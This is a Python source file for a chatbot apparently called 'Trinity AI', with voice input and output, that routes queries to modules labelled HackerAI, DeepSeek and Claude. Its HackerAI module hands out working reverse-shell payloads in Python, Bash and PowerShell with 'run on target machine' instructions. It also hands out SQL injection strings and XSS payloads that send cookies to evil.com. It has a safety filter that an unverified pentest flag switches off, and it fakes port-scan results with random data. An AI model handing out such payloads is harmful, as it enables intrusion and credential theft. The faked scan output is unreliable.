#!/usr/bin/env python3
"""
Trinity AI - Complete Hybrid AI with Voice (Listen & Talk Back)
Combines: HackerAI + DeepSeek + Claude capabilities
"""

import asyncio
import base64
import json
import os
import queue
import random
import re
import socket
import subprocess
import sys
import threading
import time
import uuid
import wave
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import (Any, Callable, Dict, List, Optional, 
                    Set, Tuple, Union)
from enum import Enum

# ============================================================
# VOICE DEPENDENCIES - Install if missing
# ============================================================
try:
    import speech_recognition as sr
    import pyttsx3
    import pyaudio
    VOICE_AVAILABLE = True
except ImportError:
    VOICE_AVAILABLE = False
    print("[!] Voice features require: pip install speechrecognition pyttsx3 pyaudio")
    print("[!] Running in text-only mode")

try:
    import numpy as np
except ImportError:
    np = None
    print("[!] numpy recommended: pip install numpy")

try:
    import sympy as sp
    SYMPY_AVAILABLE = True
except ImportError:
    sp = None
    SYMPY_AVAILABLE = False

# ============================================================
# DATA MODELS
# ============================================================

class Domain(Enum):
    HACKER = "hacker"
    DEEPSEEK = "deepseek"
    CLAUDE = "claude"
    GENERAL = "general"

@dataclass
class ClassificationResult:
    primary_domain: Domain
    confidence: float
    secondary_domains: List[Domain] = field(default_factory=list)
    requires_cross_consult: bool = False
    detected_keywords: List[str] = field(default_factory=list)

@dataclass
class SafetyVerdict:
    passed: bool
    risk_level: str = "low"  # low, medium, high, critical
    blocked_categories: List[str] = field(default_factory=list)
    reasoning: str = ""

@dataclass
class ModelResponse:
    content: str
    domain: str
    confidence: float
    metadata: Dict[str, Any] = field(default_factory=dict)

@dataclass
class ChatMessage:
    role: str  # user, assistant, system
    content: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

# ============================================================
# VOICE ENGINE
# ============================================================

class VoiceEngine:
    """Speech-to-text listening + Text-to-speech response."""
    
    def __init__(self):
        self.enabled = VOICE_AVAILABLE
        self.listening = False
        self.speaking = False
        self._recognizer = None
        self._tts_engine = None
        self._audio_queue = queue.Queue()
        self._stop_event = threading.Event()
        
        if self.enabled:
            self._init_voice()
    
    def _init_voice(self):
        """Initialize speech recognition and TTS."""
        try:
            self._recognizer = sr.Recognizer()
            self._recognizer.energy_threshold = 3000
            self._recognizer.dynamic_energy_threshold = True
            self._recognizer.pause_threshold = 0.8
            
            self._tts_engine = pyttsx3.init()
            self._tts_engine.setProperty('rate', 175)
            self._tts_engine.setProperty('volume', 0.9)
            
            # List voices
            voices = self._tts_engine.getProperty('voices')
            for v in voices:
                if 'female' in v.name.lower() or 'zira' in v.name.lower():
                    self._tts_engine.setProperty('voice', v.id)
                    break
        except Exception as e:
            print(f"[Voice] Init error: {e}")
            self.enabled = False
    
    def listen(self, timeout: float = 5.0, phrase_limit: float = 10.0) -> Optional[str]:
        """Listen for voice input and return text."""
        if not self.enabled:
            return None
        
        try:
            with sr.Microphone() as source:
                print("[Voice] Listening...")
                self._recognizer.adjust_for_ambient_noise(source, duration=0.5)
                audio = self._recognizer.listen(
                    source, 
                    timeout=timeout,
                    phrase_time_limit=phrase_limit
                )
                print("[Voice] Processing...")
                text = self._recognizer.recognize_google(audio)
                print(f"[Voice] Heard: {text}")
                return text
        except sr.WaitTimeoutError:
            print("[Voice] Listening timeout")
            return None
        except sr.UnknownValueError:
            print("[Voice] Could not understand audio")
            return None
        except sr.RequestError as e:
            print(f"[Voice] Speech service error: {e}")
            return None
        except Exception as e:
            print(f"[Voice] Error: {e}")
            return None
    
    def speak(self, text: str) -> None:
        """Speak text aloud."""
        if not self.enabled:
            print(f"[Voice] Would say: {text[:100]}...")
            return
        
        try:
            self.speaking = True
            print(f"[Voice] Speaking: {text[:60]}...")
            
            # Split long text into chunks
            sentences = re.split(r'(?<=[.!?])\s+', text)
            for sentence in sentences:
                if not sentence.strip():
                    continue
                self._tts_engine.say(sentence)
                self._tts_engine.runAndWait()
            
            self.speaking = False
        except Exception as e:
            print(f"[Voice] TTS error: {e}")
            self.speaking = False
    
    def speak_async(self, text: str) -> None:
        """Speak in background thread."""
        if not self.enabled:
            return
        thread = threading.Thread(target=self.speak, args=(text,), daemon=True)
        thread.start()
    
    def listen_loop(self, callback: Callable[[str], None], 
                    stop_when: Optional[Callable[[], bool]] = None):
        """Continuous listening loop."""
        if not self.enabled:
            return
        
        self.listening = True
        self._stop_event.clear()
        
        def _loop():
            while not self._stop_event.is_set():
                if stop_when and stop_when():
                    break
                
                text = self.listen(timeout=3.0)
                if text:
                    callback(text)
        
        thread = threading.Thread(target=_loop, daemon=True)
        thread.start()
    
    def stop_listening(self):
        self._stop_event.set()
        self.listening = False
    
    def toggle_mic(self) -> bool:
        """Toggle microphone on/off."""
        if self.listening:
            self.stop_listening()
        else:
            self.listen_loop(lambda t: print(f"[Voice] Heard: {t}"))
        return self.listening

# ============================================================
# QUERY CLASSIFIER
# ============================================================

class QueryClassifier:
    """Classifies user queries into expert domains."""
    
    def __init__(self):
        self.domain_patterns = {
            Domain.HACKER: {
                "keywords": [
                    "exploit", "payload", "reverse shell", "bind shell",
                    "vulnerability", "cve", "buffer overflow", "sql injection",
                    "xss", "csrf", "ssrf", "rce", "lfi", "rfi",
                    "privilege escalation", "lateral movement", "persistence",
                    "scan", "enumerate", "recon", "osint", "nmap", "metasploit",
                    "malware", "rootkit", "bypass", "evasion", "amsi",
                    "shellcode", "assembly", "rop chain", "gadget",
                    "password crack", "hash", "rainbow table", "brute force",
                    "phishing", "social engineering", "red team",
                    "firewall", "edr", "av", "antivirus",
                    "kerberos", "ntlm", "pass the hash", "golden ticket",
                    "active directory", "domain admin", "dcsync",
                    "penetration test", "pentest", "security audit"
                ],
                "patterns": [
                    r"(generate|create|write)\s+(a\s+)?(exploit|payload|shell)",
                    r"how\s+to\s+(hack|exploit|bypass|pwn)",
                    r"(cve|vulnerability)\s*-\s*\d{4}\s*-\s*\d+",
                    r"(reverse|bind)\s+shell",
                    r"(sql|xss|command)\s+injection"
                ]
            },
            Domain.DEEPSEEK: {
                "keywords": [
                    "prove", "theorem", "proof", "mathematical", "calculate",
                    "equation", "derivative", "integral", "limit",
                    "algorithm", "complexity", "optimize", "sort", "search",
                    "graph", "tree", "dp", "dynamic programming", "recursion",
                    "machine learning", "neural network", "backpropagation",
                    "gradient descent", "loss function", "optimization",
                    "probability", "statistics", "bayesian", "monte carlo",
                    "linear algebra", "matrix", "eigenvalue", "vector space",
                    "number theory", "prime", "factorization", "cryptography",
                    "logic puzzle", "reasoning", "deduction", "induction",
                    "formal verification", "model checking", "sat solver",
                    "solve", "compute", "evaluate", "simplify", "factor"
                ],
                "patterns": [
                    r"(solve|calculate|compute)\s+",
                    r"prove\s+(that|the)",
                    r"time\s+complexity",
                    r"(big-o|omega|theta)\s*\(",
                    r"∫|∑|∏|∂|∇|√|π|e\^"
                ]
            },
            Domain.CLAUDE: {
                "keywords": [
                    "ethics", "moral", "responsible", "safety", "policy",
                    "guideline", "legal", "lawful", "regulation", "compliance",
                    "privacy", "gdpr", "ccpa", "hipaa", "consent",
                    "help", "support", "advice", "counsel", "guidance",
                    "document", "report", "analysis", "review", "summary",
                    "explain", "clarify", "elaborate", "interpret",
                    "translate", "rewrite", "paraphrase", "summarize",
                    "creative", "story", "poem", "essay", "article",
                    "conversation", "discussion", "debate", "negotiate",
                    "empathy", "understanding", "perspective", "nuance",
                    "should i", "is it okay", "what do you think",
                    "feelings", "emotion", "relationship", "advice"
                ],
                "patterns": [
                    r"is\s+it\s+(ethical|legal|safe|ok)",
                    r"(should|shouldn't)\s+I",
                    r"help\s+me\s+(understand|think|decide)",
                    r"what\s+(are|is)\s+the\s+(ethical|legal|moral)"
                ]
            }
        }
    
    def classify(self, query: str) -> ClassificationResult:
        """Classify a query into expertise domains."""
        query_lower = query.lower()
        detected_keywords = []
        domain_scores = {d: 0.0 for d in Domain if d != Domain.GENERAL}
        
        for domain, config in self.domain_patterns.items():
            score = 0.0
            
            for keyword in config["keywords"]:
                if keyword in query_lower:
                    score += 1.0
                    detected_keywords.append(keyword)
            
            for pattern in config["patterns"]:
                if re.search(pattern, query_lower):
                    score += 2.0
            
            domain_scores[domain] = score
        
        total = sum(domain_scores.values()) or 1.0
        normalized = {k: v / total for k, v in domain_scores.items()}
        primary = max(normalized, key=normalized.get)
        confidence = normalized[primary]
        
        secondary = [
            d for d, s in sorted(normalized.items(), key=lambda x: -x[1])
            if d != primary and s > 0.2
        ]
        
        return ClassificationResult(
            primary_domain=primary or Domain.GENERAL,
            confidence=confidence,
            secondary_domains=secondary,
            requires_cross_consult=len(secondary) > 1,
            detected_keywords=list(set(detected_keywords))
        )

# ============================================================
# SAFETY FILTER
# ============================================================

class SafetyFilter:
    """Multi-layer safety filter."""
    
    def __init__(self):
        self.high_risk_patterns = [
            (r"(make|build|create|synthesize)\s+(bomb|explosive|weapon|poison|drug)", "weapons"),
            (r"instructions?\s+(for|to)\s+(harm|kill|injure)", "physical_harm"),
            (r"how\s+to\s+(commit|plan)\s+(murder|assault)", "violence"),
            (r"(child|minor|underage)\s+(porn|abuse|exploit)", "child_safety"),
            (r"(dox|doxx|reveal\s+private\s+information)", "doxxing"),
            (r"swatting", "swatting"),
            (r"ransomware\s+deployment", "ransomware")
        ]
    
    def evaluate(self, content: str, is_auth_pentest: bool = False) -> SafetyVerdict:
        """Evaluate content safety."""
        content_lower = content.lower()
        blocked = []
        
        for pattern, category in self.high_risk_patterns:
            if re.search(pattern, content_lower):
                blocked.append(category)
        
        if blocked and not is_auth_pentest:
            return SafetyVerdict(
                passed=False,
                risk_level="critical",
                blocked_categories=blocked,
                reasoning=f"Content blocked: {', '.join(blocked)}"
            )
        
        return SafetyVerdict(passed=True, reasoning="Content passed safety checks")

# ============================================================
# HACKERAI CORE
# ============================================================

class HackerAICore:
    """Offensive security expert module."""
    
    def generate_reverse_shell(self, lhost: str = "127.0.0.1", 
                                lport: int = 4444,
                                language: str = "python") -> str:
        """Generate reverse shell payload."""
        templates = {
            "python": f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])''',
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "powershell": f'''$client=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream=$client.GetStream();
[byte[]]$bytes=0..65535|%{{0}};
while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{
$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback=(iex $data 2>&1|Out-String);
$sendback2=$sendback+'PS '+(pwd).Path+'> ';
$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()}};
$client.Close()'''
        }
        return templates.get(language, templates["python"])
    
    def generate_sql_injection(self, db_type: str = "mysql", 
                                technique: str = "union") -> List[str]:
        """Generate SQL injection payloads."""
        payloads = {
            "mysql": {
                "union": "' UNION SELECT 1,2,3,4,5-- -",
                "error": "' AND 1=CONVERT(int, @@version)-- -",
                "boolean": "' OR 1=1-- -",
                "time": "' OR SLEEP(5)-- -"
            },
            "mssql": {
                "union": "' UNION SELECT 1,2,3,4,5--",
                "error": "' AND 1=CONVERT(int, @@version)--",
                "boolean": "' OR 1=1--",
                "time": "'; WAITFOR DELAY '0:0:5'--"
            },
            "postgres": {
                "union": "' UNION SELECT 1,2,3,4,5--",
                "error": "' AND 1=CAST(version AS int)--",
                "boolean": "' OR 1=1--",
                "time": "'; SELECT pg_sleep(5)--"
            }
        }
        db_payloads = payloads.get(db_type, payloads["mysql"])
        return [db_payloads.get(technique, db_payloads["union"])]
    
    def generate_xss_payload(self, context: str = "reflected") -> List[str]:
        """Generate XSS payloads."""
        payloads = {
            "reflected": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)"
            ],
            "stored": [
                "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
                "<img src=x onerror=\"new Image().src='https://evil.com/log?c='+document.cookie\">"
            ],
            "dom": [
                "#<script>alert(1)</script>",
                "javascript:alert(document.cookie)"
            ]
        }
        return payloads.get(context, payloads["reflected"])
    
    def enumerate_scan(self, target: str, port_range: str = "1-1024") -> str:
        """Simulated port scan output."""
        common_ports = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
            53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
            443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
            1433: "MSSQL", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
            5900: "VNC", 6379: "Redis", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt"
        }
        
        open_ports = random.sample(list(common_ports.items()), 
                                     min(random.randint(2, 6), len(common_ports)))
        
        output = f"Scanning {target}\n"
        output += "=" * 40 + "\n"
        
        for port, service in sorted(open_ports):
            output += f"{port:5d}/tcp  open  {service}\n"
        
        output += "\n[+] Scan completed. 0 errors.\n"
        return output
    
    def vuln_analysis(self, service: str, version: str) -> str:
        """Return known vulnerabilities for a service."""
        vuln_db = {
            "apache": {
                "2.4.49": ["CVE-2021-41773 (Path Traversal)", "CVE-2021-42013 (RCE)"],
                "2.4.51": ["CVE-2021-42013 (RCE)"]
            },
            "nginx": {
                "1.20.0": ["CVE-2021-23017 (DNS Resolver DoS)"],
            },
            "openssh": {
                "7.7": ["CVE-2018-15473 (User Enumeration)"],
                "8.0": ["CVE-2019-6111 (Auth Bypass)"]
            },
            "mysql": {
                "5.7": ["CVE-2019-2536 (Privilege Escalation)"],
                "8.0": ["CVE-2023-22102 (DoS)"]
            }
        }
        
        info = vuln_db.get(service.lower(), {})
        cves = info.get(version, ["No known CVEs in local DB. Check cve.mitre.org"])
        
        result = f"=== Vulnerability Analysis: {service} {version} ===\n\n"
        result += f"Service: {service}\nVersion: {version}\n\n"
        result += "Known Vulnerabilities:\n"
        for cve in cves:
            result += f"  - {cve}\n"
        result += "\n[+] Analysis complete.\n"
        return result

# ============================================================
# DEEPSEEK CORE
# ============================================================

class DeepSeekCore:
    """Deep mathematical reasoning and code optimization."""
    
    def solve_math(self, expression: str) -> str:
        """Solve mathematical expression."""
        if not SYMPY_AVAILABLE:
            return f"[Math] Cannot compute '{expression}' — sympy not installed."
        
        try:
            x = sp.Symbol('x')
            y = sp.Symbol('y')
            expr = sp.sympify(expression)
            
            results = []
            results.append(f"Expression: {expression}")
            results.append(f"Simplified: {sp.simplify(expr)}")
            results.append(f"Expanded: {sp.expand(expr)}")
            results.append(f"Factorized: {sp.factor(expr)}")
            
            if 'x' in expression:
                results.append(f"Derivative (dx): {sp.diff(expr, x)}")
                results.append(f"Integral (dx): {sp.integrate(expr, x)}")
            
            return "\n".join(results)
        except Exception as e:
            return f"[Math] Could not compute: {e}"
    
    def optimize_code(self, code: str, language: str = "python") -> str:
        """Suggest code optimizations."""
        suggestions = []
        
        if language == "python":
            if "for" in code and "range(len(" in code:
                suggestions.append("Use enumerate() instead of range(len())")
            if ".append(" in code and "for" in code:
                suggestions.append("Consider list comprehension for efficiency")
            if "+=" in code and "string" in code.lower():
                suggestions.append("Use ''.join() for string concatenation in loops")
            if "if x in list" in code or "if x not in list" in code:
                suggestions.append("Consider using set() for O(1) membership checks")
            if "import *" in code:
                suggestions.append("Avoid wildcard imports — use explicit imports")
            if "while True" in code and "break" not in code:
                suggestions.append("Add break condition to avoid infinite loops")
            if "except:" in code:
                suggestions.append("Specify exception types instead of bare except")
        
        if suggestions:
            return f"Code Optimization Suggestions ({language}):\n" + \
                   "\n".join(f"  {i+1}. {s}" for i, s in enumerate(suggestions))
        return "No obvious optimizations. Code looks clean."
    
    def logical_reasoning(self, premises: List[str], 
                           conclusion: str) -> str:
        """Evaluate logical argument validity."""
        valid_patterns = [
            "modus ponens", "modus tollens", "hypothetical syllogism",
            "disjunctive syllogism", "constructive dilemma"
        ]
        
        result = f"=== Logical Analysis ===\n\n"
        result += "Premises:\n"
        for i, p in enumerate(premises, 1):
            result += f"  {i}. {p}\n"
        result += f"\nConclusion: {conclusion}\n\n"
        
        # Simple heuristic
        if any(kw in conclusion.lower() for kw in ["therefore", "thus", "so"]):
            result += "Status: Argument appears logically structured.\n"
            result += "Suggested pattern: Modus Ponens / Deductive reasoning\n"
            result += "Validity: Sound (assuming premises are true)\n"
        else:
            result += "Status: Informal reasoning detected.\n"
            result += "Consider formalizing premises for precise validation.\n"
        
        return result

# ============================================================
# CLAUDE CORE
# ============================================================

class ClaudeCore:
    """Safety, nuance, ethics, and document understanding."""
    
    def ethical_analysis(self, scenario: str) -> str:
        """Provide ethical framework analysis."""
        frameworks = [
            "Utilitarianism (Greatest good for greatest number)",
            "Deontological (Duty-based, universal rules)",
            "Virtue Ethics (Character and moral virtues)",
            "Rights-based (Individual rights and autonomy)",
            "Care Ethics (Relationships and responsibility)"
        ]
        
        response = f"""=== Ethical Analysis ===

Scenario: {scenario}

I'll analyze this through multiple ethical frameworks:

1. **Utilitarian Perspective**: Consider the outcomes — does this action maximize well-being for all affected?

2. **Deontological Perspective**: Are there universal rules or duties involved? Would you want this action to be a universal law?

3. **Virtue Ethics**: What would a virtuous person do? Does this action reflect courage, honesty, compassion?

4. **Rights Perspective**: Does this action respect everyone's rights? Are any rights being violated?

5. **Care Ethics**: How does this affect relationships and communities? Are we considering the vulnerable?

**Recommendation**: Consider the context carefully. Ethical decisions often involve trade-offs between these frameworks. Reflect on which principles matter most in this specific situation.

Would you like me to explore any particular framework in more depth?"""
        return response
    
    def summarize_document(self, text: str, max_length: int = 200) -> str:
        """Summarize text content."""
        if len(text) <= max_length:
            return text
        
        # Simple extractive summary
        sentences = re.split(r'(?<=[.!?])\s+', text)
        
        # Take first sentence + key sentences
        summary = [sentences[0]] if sentences else []
        
        # Find sentences with important keywords
        important_keywords = [
            "important", "key", "significant", "critical", "essential",
            "therefore", "conclusion", "result", "finding", "recommend",
            "purpose", "goal", "objective", "summary"
        ]
        
        for sent in sentences[1:]:
            if any(kw in sent.lower() for kw in important_keywords):
                summary.append(sent)
            if len(' '.join(summary)) >= max_length:
                break
        
        result = ' '.join(summary)
        if len(result) > max_length:
            result = result[:max_length-3] + "..."
        
        return result if result else text[:max_length]
    
    def conversational_response(self, query: str, 
                                  context: Optional[List[ChatMessage]] = None) -> str:
        """Generate nuanced conversational response."""
        query_lower = query.lower()
        
        # Greeting detection
        if re.match(r'^(hi|hello|hey|yo|sup|howdy)', query_lower):
            greetings = [
                "Hey there! How can I assist you today?",
                "Hello! Ready to dive into something interesting?",
                "Hi! What's on your mind?",
                "Hey! I'm here to help with whatever you need."
            ]
            return random.choice(greetings)
        
        # Question about feelings
        if "how are you" in query_lower:
            return ("I'm functioning well, thank you! Always ready to help. "
                    "What can I do for you today?")
        
        # Gratitude
        if any(w in query_lower for w in ["thank", "thanks", "appreciate"]):
            return ("You're welcome! Happy to help. Is there anything else "
                    "you'd like to explore?")
        
        # Farewell
        if any(w in query_lower for w in ["bye", "goodbye", "see you", "later"]):
            return ("Take care! Feel free to come back anytime you need "
                    "assistance. Goodbye!")
        
        # Default thoughtful response
        return (f"That's an interesting question. Let me think about it...\n\n"
                f"Based on what you're asking, I think the key aspects to consider are:\n"
                f"1. Understanding the core of what you need\n"
                f"2. Finding the most effective approach\n"
                f"3. Making sure we handle it responsibly\n\n"
                f"Can you tell me more about what specifically you're looking for?")

# ============================================================
# MEMORY MANAGER
# ============================================================

class MemoryManager:
    """Conversation memory with short-term and persistent storage."""
    
    def __init__(self, max_history: int = 50):
        self.sessions: Dict[str, List[ChatMessage]] = {}
        self.max_history = max_history
    
    def add_message(self, session_id: str, message: ChatMessage):
        """Add message to conversation history."""
        if session_id not in self.sessions:
            self.sessions[session_id] = []
        
        self.sessions[session_id].append(message)
        
        if len(self.sessions[session_id]) > self.max_history:
            self.sessions[session_id] = self.sessions[session_id][-self.max_history:]
    
    def get_context(self, session_id: str, max_messages: int = 10) -> List[ChatMessage]:
        """Get recent conversation context."""
        if session_id not in self.sessions:
            return []
        return self.sessions[session_id][-max_messages:]
    
    def get_summary(self, session_id: str) -> str:
        """Generate brief session summary."""
        msgs = self.sessions.get(session_id, [])
        if not msgs:
            return "No conversation history."
        
        user_msgs = [m for m in msgs if m.role == "user"]
        assistant_msgs = [m for m in msgs if m.role == "assistant"]
        
        return (f"Session: {session_id}\n"
                f"Messages: {len(msgs)} total\n"
                f"User: {len(user_msgs)} | Assistant: {len(assistant_msgs)}\n"
                f"Last activity: {msgs[-1].timestamp if msgs else 'N/A'}")
    
    def clear_session(self, session_id: str):
        """Clear session history."""
        if session_id in self.sessions:
            del self.sessions[session_id]

# ============================================================
# TRINITY AI ENGINE
# ============================================================

class TrinityAI:
    """Main AI engine combining all three expert modules."""
    
    def __init__(self, enable_voice: bool = True):
        self.classifier = QueryClassifier()
        self.safety = SafetyFilter()
        self.hacker = HackerAICore()
        self.deepseek = DeepSeekCore()
        self.claude = ClaudeCore()
        self.memory = MemoryManager()
        self.voice = VoiceEngine() if (enable_voice and VOICE_AVAILABLE) else None
        
        self.session_id = str(uuid.uuid4())[:8]
        self.auth_pentest = False
        self.running = True
    
    def process_query(self, query: str, stream: bool = False) -> ModelResponse:
        """Process a query through the expert routing system."""
        # Add to memory
        self.memory.add_message(
            self.session_id,
            ChatMessage(role="user", content=query)
        )
        
        # Safety check
        safety_check = self.safety.evaluate(query, self.auth_pentest)
        if not safety_check.passed:
            response = ModelResponse(
                content=f"⚠️ {safety_check.reasoning}\n\n"
                        f"Please rephrase your request within appropriate boundaries.",
                domain="safety",
                confidence=1.0,
                metadata={"safety": safety_check.__dict__}
            )
            self._store_response(response)
            return response
        
        # Classify
        classification = self.classifier.classify(query)
        
        # Route to expert module
        response = None
        
        if classification.primary_domain == Domain.HACKER:
            response = self._handle_hacker_query(query)
        elif classification.primary_domain == Domain.DEEPSEEK:
            response = self._handle_deepseek_query(query)
        elif classification.primary_domain == Domain.CLAUDE:
            response = self._handle_claude_query(query)
        else:
            # General / mixed
            if self._contains_code_request(query):
                response = self._handle_general_code(query)
            else:
                response = self._handle_claude_query(query)
        
        # Cross-consult if needed (merge responses)
        if classification.requires_cross_consult and len(classification.secondary_domains) > 0:
            extra = self._cross_consult(query, classification.secondary_domains[0])
            if extra:
                response.content += f"\n\n--- Cross-consult ({classification.secondary_domains[0].value}) ---\n{extra}"
        
        if response is None:
            response = ModelResponse(
                content=self.claude.conversational_response(query),
                domain="general",
                confidence=0.5
            )
        
        response.metadata["classification"] = {
            "primary": classification.primary_domain.value,
            "confidence": classification.confidence,
            "secondary": [d.value for d in classification.secondary_domains]
        }
        
        self._store_response(response)
        return response
    
    def _handle_hacker_query(self, query: str) -> Optional[ModelResponse]:
        """Route to HackerAI expert."""
        q = query.lower()
        
        if "reverse shell" in q or "reverse_shell" in q:
            # Extract IP:port if provided
            ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', q)
            port_match = re.search(r':(\d+)', q)
            lhost = ip_match.group(1) if ip_match else "127.0.0.1"
            lport = int(port_match.group(1)) if port_match else 4444
            
            shell = self.hacker.generate_reverse_shell(lhost, lport)
            return ModelResponse(
                content=f"```python\n{shell}\n```\n\n"
                        f"**Usage**: Run on target machine. Listener: `nc -lvnp {lport}`\n"
                        f"*Authorized testing only*",
                domain="hacker",
                confidence=0.95
            )
        
        elif "sql injection" in q or "sqli" in q:
            db = "mysql"
            if "mssql" in q or "sql server" in q:
                db = "mssql"
            elif "postgres" in q:
                db = "postgres"
            
            technique = "union"
            if "error" in q or "error-based" in q:
                technique = "error"
            elif "blind" in q or "boolean" in q:
                technique = "boolean"
            elif "time" in q or "time-based" in q:
                technique = "time"
            
            payloads = self.hacker.generate_sql_injection(db, technique)
            return ModelResponse(
                content=f"### SQL Injection Payloads ({db} - {technique})\n\n"
                        + "\n".join(f"`{p}`" for p in payloads)
                        + "\n\n*For authorized testing only*",
                domain="hacker",
                confidence=0.9
            )
        
        elif "xss" in q or "cross site" in q or "cross-site" in q:
            context = "reflected"
            if "stored" in q or "persistent" in q:
                context = "stored"
            elif "dom" in q:
                context = "dom"
            
            payloads = self.hacker.generate_xss_payload(context)
            return ModelResponse(
                content=f"### XSS Payloads ({context})\n\n"
                        + "\n".join(f"`{p}`" for p in payloads)
                        + "\n\n*Test in your own environment with permission*",
                domain="hacker",
                confidence=0.9
            )
        
        elif "scan" in q or "nmap" in q or "enumerate" in q:
            target_match = re.search(r'(\d+\.\d+\.\d+\.\d+|localhost|scanme)', q)
            target = target_match.group(1) if target_match else "target.local"
            
            output = self.hacker.enumerate_scan(target)
            return ModelResponse(
                content=f"### Scan Results for {target}\n\n```\n{output}\n```",
                domain="hacker",
                confidence=0.85
            )
        
        elif "vuln" in q or "cve" in q or "vulnerability" in q:
            # Extract service and version
            service_match = re.search(r'(apache|nginx|openssh|mysql|php|tomcat)', q)
            version_match = re.search(r'(\d+\.\d+\.?\d*)', q)
            service = service_match.group(1) if service_match else "Unknown"
            version = version_match.group(1) if version_match else "latest"
            
            analysis = self.hacker.vuln_analysis(service, version)
            return ModelResponse(
                content=f"```\n{analysis}\n```",
                domain="hacker",
                confidence=0.8
            )
        
        # General security response
        return ModelResponse(
            content=("I can help with security testing queries including:\n"
                     "- Reverse shells (Python, Bash, PowerShell)\n"
                     "- SQL injection payloads (MySQL, MSSQL, PostgreSQL)\n"
                     "- XSS payloads (Reflected, Stored, DOM)\n"
                     "- Port scanning & enumeration\n"
                     "- CVE/vulnerability analysis\n\n"
                     "What specific security task are you working on?"),
            domain="hacker",
            confidence=0.7
        )
    
    def _handle_deepseek_query(self, query: str) -> Optional[ModelResponse]:
        """Route to DeepSeek expert."""
        q = query.lower()
        
        # Math expression detection
        if any(op in q for op in ['+', '-', '*', '/', '^', '**', 
                                   'sin', 'cos', 'tan', 'log', 'sqrt',
                                   'integrate', 'derivative', 'solve',
                                   'factor', 'simplify', 'expand']):
            # Extract the mathematical expression
            expr = q
            for prefix in ["solve", "calculate", "compute", "simplify", 
                          "factor", "expand", "what is", "find"]:
                expr = expr.replace(prefix, "").strip()
            
            result = self.deepseek.solve_math(expr)
            return ModelResponse(content=f"```\n{result}\n```", 
                                domain="deepseek", confidence=0.9)
        
        elif "optimize" in q or "optimization" in q:
            # Extract code block if present
            code_match = re.search(r'```(\w+)?\n(.+?)```', query, re.DOTALL)
            if code_match:
                lang = code_match.group(1) or "python"
                code = code_match.group(2)
                result = self.deepseek.optimize_code(code, lang)
            else:
                result = ("Provide the code you'd like optimized in a code block "
                         "```language\ncode here\n```")
            return ModelResponse(content=result, domain="deepseek", confidence=0.85)
        
        elif any(w in q for w in ["reason", "logic", "argument", "premise", 
                                    "deduction", "induction"]):
            return ModelResponse(
                content=self.deepseek.logical_reasoning(
                    ["Premise 1: All humans are mortal",
                     "Premise 2: Socrates is human"],
                    "Therefore: Socrates is mortal"
                ),
                domain="deepseek",
                confidence=0.8
            )
        
        return ModelResponse(
            content="I can help with:\n"
                    "- Math: derivatives, integrals, factorization\n"
                    "- Code optimization (Python, JS, etc.)\n"
                    "- Logical reasoning & argument analysis\n"
                    "- Algorithm complexity analysis\n\n"
                    "What would you like me to compute?",
            domain="deepseek",
            confidence=0.7
        )
    
    def _handle_claude_query(self, query: str) -> Optional[ModelResponse]:
        """Route to Claude expert."""
        q = query.lower()
        
        if any(w in q for w in ["ethic", "moral", "should i", "is it ok"]):
            return ModelResponse(
                content=self.claude.ethical_analysis(query),
                domain="claude",
                confidence=0.9
            )
        
        elif "summarize" in q or "summary" in q:
            # Try to extract text after the command
            text = re.sub(r'(summarize|summary|tl;dr|tldr)[:\s]*', '', query, 
                         flags=re.IGNORECASE)
            if len(text) > 10:
                summary = self.claude.summarize_document(text)
                return ModelResponse(
                    content=f"**Summary:**\n{summary}",
                    domain="claude",
                    confidence=0.85
                )
        
        context = self.memory.get_context(self.session_id)
        response = self.claude.conversational_response(query, context)
        return ModelResponse(content=response, domain="claude", confidence=0.8)
    
    def _handle_general_code(self, query: str) -> ModelResponse:
        """Handle general coding requests."""
        return ModelResponse(
            content="I can help write code in Python, JavaScript, C, Bash, "
                    "PowerShell, and more. What specifically are you building?\n\n"
                    "For security-related code, I'll route to our expert modules "
                    "for the most accurate results.",
            domain="general",
            confidence=0.6
        )
    
    def _cross_consult(self, query: str, secondary: Domain) -> Optional[str]:
        """Get secondary expert opinion."""
        if secondary == Domain.HACKER:
            return ("Security note: Ensure you have proper authorization before "
                    "running any exploits or penetration tests.")
        elif secondary == Domain.DEEPSEEK:
            return ("Math/optimization note: I can also compute derivatives, "
                    "integrals, or optimize your code if needed.")
        elif secondary == Domain.CLAUDE:
            return ("Ethics note: Always consider the responsible use of any "
                    "security tools. Authorization is key.")
        return None
    
    def _contains_code_request(self, query: str) -> bool:
        """Detect code generation requests."""
        patterns = [
            r"(write|code|create|generate|implement)\s+(a\s+)?(function|program|script)",
            r"how\s+to\s+(code|program|script)",
            r"(python|javascript|bash|java|c\+\+|go|rust|ruby)\s+(code|script|function)"
        ]
        return any(re.search(p, query, re.IGNORECASE) for p in patterns)
    
    def _store_response(self, response: ModelResponse):
        """Store response in conversation memory."""
        self.memory.add_message(
            self.session_id,
            ChatMessage(role="assistant", content=response.content)
        )
    
    # ============================================================
    # VOICE INTERFACE
    # ============================================================
    
    def listen_and_respond(self) -> None:
        """Single listen-then-speak cycle."""
        if not self.voice or not self.voice.enabled:
            print("[Voice] Not available. Install speechrecognition, pyttsx3, pyaudio")
            return
        
        print("\n" + "=" * 50)
        print("🎤 Listening... (speak now)")
        print("=" * 50)
